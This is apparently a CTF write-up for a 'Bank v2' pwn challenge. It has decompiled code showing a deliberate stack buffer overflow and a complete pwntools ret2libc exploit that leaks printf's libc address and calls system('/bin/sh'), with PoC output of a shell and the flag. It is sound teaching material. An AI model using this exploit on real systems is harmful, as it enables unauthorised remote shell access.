# [__💲 Bank v2💲__](#)

## Description: 

* Our secret files are not available now. We made our authentication system safer than ever! Nobody will bypass it now.. 

## Objective: 

* `Buffer Overflow` and `ret2libc` attack.

## Flag: 🏁
* `INSSEC{th3_v2_v3rs10n_1s_st1ll_pwn4bl3!}`

### Difficulty:
* Hard

## Challenge:

The interface looks like this:

```console
[*] Authentication required!
1. Insert credentials.
2. Leave.
> 1

Password: 
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[1]    14721 segmentation fault (core dumped)  ./bank_v2
```

As we can see, there is a `SegFault` after some "A"s. That means there is a possible `BufferOverflow`.

We run a `checksec` to verify this:

```sh
[*] '/home/w3th4nds/github/Patra_CTF_2021_private/pwn/Bank_v2/bank_v2'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

`Canary` and `PIE` are disabled, so `bof` will be even easier now.

Let's open a disassembler to analyze the program.

### Disassembly 

We start from `main()`:

```c
undefined8 main(void)

{
  int local_c;
  
  setup();
  local_c = 0;
  printf("\x1b[1;36m");
  printstr("\n[*] Authentication required!\n1. Insert credentials.\n2. Leave.\n> ");
  __isoc99_scanf(&DAT_00400a12,&local_c);
  if (local_c == 1) {
    bank();
  }
  else {
    printf("\x1b[1;31m");
  }
  printstr("[-] Incorrect passowrd!\n");
  printstr("\nExiting..\n");
  return 0;
}
```

We see that there is a call to `bank()`.

### bank()💲

```c
void bank(void)

{
  undefined local_28 [32];
  
  printstr("\nPassword: \n> ");
  read(0,local_28,0x69);
  return;
}
```

There is a visible `Buffer Overflow` because the buffer is 32 byets long and `read` reads up to 0x69.

As long as there is a `Buffer Overflow` and both 
* `PIE`
* `Canary`

are disabled, we can perform a `ret2libc` attack. The libc is given, so we won't need to find it ourselves. Because the challenge runs on `Ubuntu 18.04`, `stack alignment` is necessary.

In order to perform this attack, we need to `leak` a libc address in order to calculate `libc base` and then call something like `system("/bin/sh")`. After we leak the desired address, we need to perform a second `bof` in order to call `system`.

The leak part looks like this:

```python
def leak(junk):
	payload = junk
	payload += p64(rop.find_gadget(['pop rdi'])[0])
	payload += p64(e.got['printf'])
	payload += p64(rop.find_gadget(['ret'])[0])
	payload += p64(e.plt['printf'])
	payload += p64(rop.find_gadget(['ret'])[0])
	payload += p64(e.symbols['bank'])
	sla('>', payload)
	leaked = u64(rl()[1:-1].ljust(8, b'\x00'))
	libc.address = leaked - libc.symbols['printf']
	success(f'Leaked printf @ {hex(leaked)}')
	success(f'Libc base     @ {hex(libc.address)}')
```

We call `printf` printing `printf` address from `.got`. Then, we return to `bank` function where we will perform a second `bof`.

The system part looks like this:

```python
def shell(junk):
	payload = junk
	payload += p64(rop.find_gadget(['pop rdi'])[0])
	payload += p64(next(libc.search(b'/bin/sh')))
	payload += p64(rop.find_gadget(['ret'])[0])
	payload += p64(libc.symbols['system'])
	sla('>', payload)
	inter()
```

### Exploit 📜

```python
#!/usr/bin/python3.8
from pwn import *

ip = '172.17.0.1' # change this
port = 1337 # change this
fname = './bank_v2'
_libc = './libc.so.6'

LOCAL = False

if LOCAL:
	r = process(fname)
else:
	r = remote(ip, port)

libc = ELF(_libc)
e = ELF(fname)
rop = ROP(e)

rl = lambda : r.recvline()
ru = lambda x : r.recvuntil(x)
sla = lambda x,y : r.sendlineafter(x,y)
inter = lambda : r.interactive()

def leak(junk):
	payload = junk
	payload += p64(rop.find_gadget(['pop rdi'])[0])
	payload += p64(e.got['printf'])
	payload += p64(rop.find_gadget(['ret'])[0])
	payload += p64(e.plt['printf'])
	payload += p64(rop.find_gadget(['ret'])[0])
	payload += p64(e.symbols['bank'])
	sla('>', payload)
	leaked = u64(rl()[1:-1].ljust(8, b'\x00'))
	libc.address = leaked - libc.symbols['printf']
	success(f'Leaked printf @ {hex(leaked)}')
	success(f'Libc base     @ {hex(libc.address)}')
	

def shell(junk):
	payload = junk
	payload += p64(rop.find_gadget(['pop rdi'])[0])
	payload += p64(next(libc.search(b'/bin/sh')))
	payload += p64(rop.find_gadget(['ret'])[0])
	payload += p64(libc.symbols['system'])
	sla('>', payload)
	inter()

def pwn():
	junk = b'i'*40
	sla('>', '1')
	leak(junk)
	shell(junk)

if __name__ == '__main__':
	pwn()
```

### PoC 🏁

```console
[+] Opening connection to 172.17.0.1 on port 1337: Done
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './bank_v2'
[+] Leaked printf @ 0x7f1dcdebaf70
[+] Libc base     @ 0x7f1dcde56000
[*] Switching to interactive mode
 $ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ cat flag.txt
INSSEC{th3_v2_v3rs10n_1s_st1ll_pwn4bl3!}
```
